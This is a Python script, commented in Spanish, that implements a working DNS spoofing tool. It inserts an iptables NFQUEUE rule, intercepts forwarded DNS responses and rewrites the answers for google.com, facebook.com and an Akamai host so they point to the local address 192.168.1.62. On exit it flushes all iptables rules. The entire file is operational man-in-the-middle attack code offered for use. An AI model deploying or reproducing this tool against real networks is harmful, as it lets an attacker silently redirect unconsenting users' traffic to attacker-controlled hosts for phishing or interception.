from scapy.all import *
from netfilterqueue import NetfilterQueue
import os


class DNSSpoofer:
    def __init__(self, targets=None, queue_num=0):
        if not targets:
            raise ValueError(
                "targets deben ser diccionario como {b'domain.com':'192.168.1.200}")
        self.targets = targets
        self.queue_num = queue_num
        os.system(f"iptables -I FORWARD -j NFQUEUE --queue-num {queue_num}")
        self.queue = NetfilterQueue()

    def modify_packet(self, packet):
        qname = packet[DNSQR].qname

        packet[DNS].an = DNSRR(rrname=qname, rdata=self.targets[qname])
        packet[DNS].ancount = 1
        # recalcular campos de control
        del packet[IP].len
        del packet[IP].chksum
        del packet[UDP].len
        del packet[UDP].chksum
        return packet
    
    def process_packet(self, packet):
        scapy_packet = IP(packet.get_payload())
        # print('llega', scapy_packet.show())
        if scapy_packet.haslayer(DNSRR) and scapy_packet[DNSQR].qname in self.targets:
        # if scapy_packet.haslayer(DNSRR):
            print("entrooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo")
            original_summary = scapy_packet.summary()
            scapy_packet = self.modify_packet(scapy_packet)
            modified_summary = scapy_packet.summary()
            # print(f"Original: {original_summary} -> Modified: {modified_summary}")
            # print(f"[+] Spoofing target {scapy_packet[DNSQR].qname}")
            # scapy_packet[DNS].an = DNSRR(rrname=scapy_packet[DNSQR].qname, rdata=self.targets[scapy_packet[DNSQR].qname])
            # scapy_packet[DNS].ancount = 1
            # del scapy_packet[IP].len
            # del scapy_packet[IP].chksum
            # del scapy_packet[UDP].len
            # del scapy_packet[UDP].chksum
            # packet.set_payload(bytes(scapy_packet))
            packet.set_payload(bytes(scapy_packet)) # recalcular campos de control
        else:
            print(f"[-] No se ha modificado el paquete {scapy_packet.summary()}")
        packet.accept()

    def run(self):
        try:
            print("Inicio DNS Spoofer...")
            print("Objetivos: ", self.targets)
            print("Presiona Ctrl + C para salir")
            self.queue.bind(self.queue_num, self.process_packet)
            self.queue.run()
        except KeyboardInterrupt:
            print("Deteniendo DNS Spoofer y limpiando reglas de iptables")
            os.system(f"iptables --flush")
            # os.system(f"iptables -I FORWARD -j NFQUEUE --queue-num {self.queue_num}")
            self.queue.unbind()

if __name__ == "__main__":
    targets = {
        b'google.com.': '192.168.1.62',
        b'facebook.com.': '192.168.1.62',
        b'a1103.g2.akamai.net.': '192.168.1.62',
    }
    spoofer = DNSSpoofer(targets=targets, queue_num=0)
    spoofer.run()



            
            
